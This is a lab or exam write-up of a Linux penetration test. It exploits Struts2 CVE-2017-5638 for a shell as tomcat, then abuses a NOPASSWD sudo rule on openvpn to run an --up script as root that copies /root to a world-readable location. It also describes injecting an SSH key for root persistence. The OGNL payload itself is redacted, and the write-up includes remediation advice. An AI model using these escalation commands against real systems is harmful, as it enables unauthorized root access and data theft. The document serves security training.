# Task 1 — Linux Privilege Escalation

**CyberEd Portal — HackCamp 2026 Penetration Testing Exam**

| Field | Details |
|---|---|
| **Task** | 1 — Linux |
| **Category** | Web Exploitation → Privilege Escalation |
| **Vulnerability Class** | CWE-917: OGNL Expression Injection (Remote Code Execution) → CWE-269: Improper Privilege Management |
| **Difficulty** | Medium |
| **Target** | `<TARGET_IP>` |
| **Platform** | CyberEd Portal |
| **Group** | 362 |
| **Status** | Solved ✅ (root) |

---

## Executive Summary

The target host exposed an **Apache Tomcat / Struts2 Showcase** application on port 80 that was vulnerable to **CVE-2017-5638 (S2-045)**, a critical OGNL expression injection flaw in the `Content-Type` HTTP header that allows unauthenticated remote code execution. Exploitation yielded a shell as the low-privileged `tomcat` user.

Post-exploitation enumeration revealed a misconfigured `sudo` rule granting the `tomcat` user **passwordless (`NOPASSWD`)** execution of `/usr/sbin/openvpn` as root. OpenVPN's `--up` script option was abused to execute arbitrary commands as `root`, achieving full privilege escalation and allowing retrieval of the flag from `/root`.

**Impact:** Unauthenticated remote code execution escalating directly to full root compromise of the host.

---

## Attack Chain

```
Struts2 OGNL Injection (CVE-2017-5638 / S2-045)
                │
                ▼
        Shell as `tomcat`
                │
                ▼
   sudo NOPASSWD: /usr/sbin/openvpn
                │
                ▼
  OpenVPN --up script abuse (GTFOBins)
                │
                ▼
             root
                │
                ▼
      Read flag from /root
```

---

## 1. Reconnaissance

### 1.1 Full TCP Port Scan

A full-range TCP scan was run first to ensure no non-standard ports were missed.

```bash
nmap -p- --min-rate 5000 -T4 <TARGET_IP> -oN nmap-allports.txt
```

**Open ports identified:**

| Port | Service |
|---|---|
| 80/tcp | HTTP |
| 60022/tcp | SSH (non-standard port) |

The web service on port 80 was selected as the primary attack surface.

> **Operational note:** The target environment appeared to rate-limit or drop aggressive traffic — `nmap` reported some ports as filtered, and `gobuster` runs timed out intermittently. Individual, throttled `curl` requests proved far more reliable and were used for the remainder of the engagement.

### 1.2 Web Application Fingerprinting

```bash
curl -i http://<TARGET_IP>/
whatweb http://<TARGET_IP>/
```

**Findings:**

- `Apache-Coyote/1.1` (Apache Tomcat)
- Automatic redirect to `/showcase.action`
- Application identified as **Struts2 Showcase**

The presence of Struts2 Showcase immediately raised suspicion of known, publicly disclosed Struts2 vulnerabilities, given the framework's well-documented history of OGNL injection CVEs.

---

## 2. Initial Access — CVE-2017-5638 (Struts2 S2-045)

### 2.1 Vulnerability Overview

**CVE-2017-5638** is a critical (CVSS 10.0) vulnerability in the Jakarta Multipart parser used by Apache Struts2. It allows an attacker to inject an OGNL (Object-Graph Navigation Language) expression into the `Content-Type` HTTP header of a multipart request. The Struts2 exception-handling logic evaluates this header when parsing fails, resulting in **unauthenticated remote code execution**.

### 2.2 Confirming Exploitation

An OGNL payload was delivered via the `Content-Type` header of a request to the vulnerable `showcase.action` endpoint:

```bash
curl -s http://<TARGET_IP>/showcase.action \
  -H "Content-Type: <OGNL_PAYLOAD>"
```

**Result:**

```
uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)
```

This confirmed arbitrary command execution as the `tomcat` service account.

---

## 3. Establishing a Reliable Execution Channel

A traditional reverse shell was attempted but proved unreliable due to inconsistent routing through the lab's VPN network. Rather than lose time fighting network connectivity, command execution was kept over the existing HTTP/OGNL channel using a lightweight wrapper script that Base64-encoded each command before injecting it through the vulnerable header.

**Usage:**

```bash
./rce.sh 'id'
./rce.sh 'uname -a'
```

**Key observation:** the OGNL payload passes the decoded command as a single argument to `/bin/bash -c`, meaning shell operators (spaces, pipes, redirection) function normally inside the command string — no special escaping logic was required in the wrapper.

This blind-RCE approach traded interactivity for reliability, which was the right tradeoff given the network conditions.

---

## 4. Local Enumeration

With stable command execution as `tomcat`, standard privilege-escalation enumeration was performed.

### 4.1 Sudo Privileges

```bash
./rce.sh 'id; sudo -n -l 2>&1'
```

**Critical finding:**

```
(root) NOPASSWD: /usr/sbin/openvpn
```

The `tomcat` user could invoke `/usr/sbin/openvpn` as `root` with no password prompt — a direct privilege-escalation primitive.

### 4.2 Supplementary Checks

```bash
./rce.sh 'find / -perm -4000 -type f 2>/dev/null'   # SUID binaries
./rce.sh 'cat /proc/1/cgroup | head'                 # Containerization check
```

The cgroup output indicated the service was running inside a Docker container, which was noted as useful context but did not materially change the escalation path.

---

## 5. Privilege Escalation — sudo OpenVPN Abuse

OpenVPN supports an `--up` directive that executes a specified script whenever a connection is initialized. Since `sudo` allowed running OpenVPN as `root` without a password, this option could be repurposed to run an arbitrary script with root privileges — a technique documented on **GTFOBins**.

### 5.1 Building the Payload Script

```bash
printf '#!/bin/sh
cp -a /root /tmp/rootloot 2>/dev/null
chmod -R 777 /tmp/rootloot
id > /tmp/pwned 2>&1
' > /tmp/up.sh

chmod +x /tmp/up.sh
```

### 5.2 Triggering Execution as Root

```bash
timeout 8 sudo /usr/sbin/openvpn \
  --dev null \
  --script-security 2 \
  --up /tmp/up.sh
```

**Result:**

```
uid=0(root)
```

The `--up` script executed successfully with root privileges, and `/root` was copied to a world-readable staging location at `/tmp/rootloot`.

---

## 6. Flag Retrieval

The flag was recovered from the copied directory:

```
cybered{YOUR_FLAG_HERE}
```

> Replace `YOUR_FLAG_HERE` with the flag from your own exam deployment if publishing it is permitted by the exam's disclosure policy.

---

## 7. Alternative Escalation Path (Not Used)

A second viable technique was identified but not pursued, since the primary method already achieved the objective:

The same `--up` script primitive could instead append an attacker-controlled key to `/root/.ssh/authorized_keys`, enabling a direct **interactive SSH session as root** over the exposed non-standard SSH port (`60022`) — providing a full shell rather than a one-shot file copy.

---

## 8. Root Cause Analysis

| Weakness | Description |
|---|---|
| **Outdated/unpatched Struts2** | The application ran a version vulnerable to a 2017-disclosed critical CVE with public exploits available. |
| **Insufficient input validation** | The `Content-Type` header was evaluated as an OGNL expression during error handling instead of being treated as inert metadata. |
| **Overly permissive sudo rule** | Granting `NOPASSWD` execution of a powerful, script-capable binary (`openvpn`) to a low-privileged service account eliminated any real privilege boundary between `tomcat` and `root`. |

---

## 9. Impact

- **Unauthenticated RCE** on the web-facing host as the `tomcat` service account.
- **Full privilege escalation to root**, with no credentials required at any stage.
- Complete compromise of host confidentiality, integrity, and availability — an attacker with this access could pivot further, exfiltrate data, or persist via SSH key injection.

**Severity:** Critical.

---

## 10. Remediation Recommendations

| Recommendation | Description |
|---|---|
| **Patch Struts2** | Upgrade to a version that resolves CVE-2017-5638 (Struts 2.3.32+ / 2.5.10.1+) or migrate off Struts2 entirely. |
| **WAF / input filtering** | Deploy rules to detect and block OGNL injection patterns in HTTP headers. |
| **Principle of least privilege** | Remove the `NOPASSWD` sudo rule for `openvpn`; if automation requires it, scope it to a wrapper script with no scriptable hooks rather than the raw binary. |
| **Sudoers auditing** | Regularly audit `sudoers` entries for GTFOBins-listed binaries (`openvpn`, `vim`, `find`, `less`, etc.) granted to service accounts. |
| **Defense in depth** | Run application service accounts in hardened containers with minimal capabilities to limit the blast radius of any single RCE. |

---

## 11. Lessons Learned

**Reconnaissance**
- A full-port scan surfaced the non-standard SSH port that a default top-1000 scan would have missed.
- Technology fingerprinting (`whatweb`) was essential to quickly identify the vulnerable Struts2 component.
- Aggressive scanning triggered rate limiting; slower, targeted requests were more effective against this target.

**Exploitation**
- Struts2 S2-045 remains a reliable RCE vector on unpatched instances.
- Identifying the executing user immediately after gaining code execution shapes the entire post-exploitation strategy.
- A simple command-execution wrapper is a practical fallback when reverse shells are blocked by network conditions.

**Privilege Escalation**
- `sudo -l` should always be the first check after landing a low-privileged shell.
- `NOPASSWD` entries are frequently the fastest path to root — cross-reference the allowed binary against GTFOBins.
- OpenVPN's `--up` script hook is a well-known and highly effective privilege-escalation primitive when granted via `sudo`.

**Network Troubleshooting**
- Reverse shells can fail silently in constrained or unreliable VPN lab environments.
- Maintaining command execution over an already-working channel (HTTP) is often more productive than debugging a new one.

---

## 12. References

- **CVE-2017-5638** — Apache Struts2 S2-045 Remote Code Execution
- **GTFOBins** — OpenVPN sudo privilege-escalation technique

---

## Final Attack Path

```
Port 80
   │
   ▼
Struts2 Showcase identified
   │
   ▼
CVE-2017-5638 / S2-045 exploited
   │
   ▼
RCE as tomcat
   │
   ▼
sudo -l
   │
   ▼
NOPASSWD: /usr/sbin/openvpn
   │
   ▼
OpenVPN --up script executed
   │
   ▼
root
   │
   ▼
/root read
   │
   ▼
🚩 FLAG CAPTURED
```
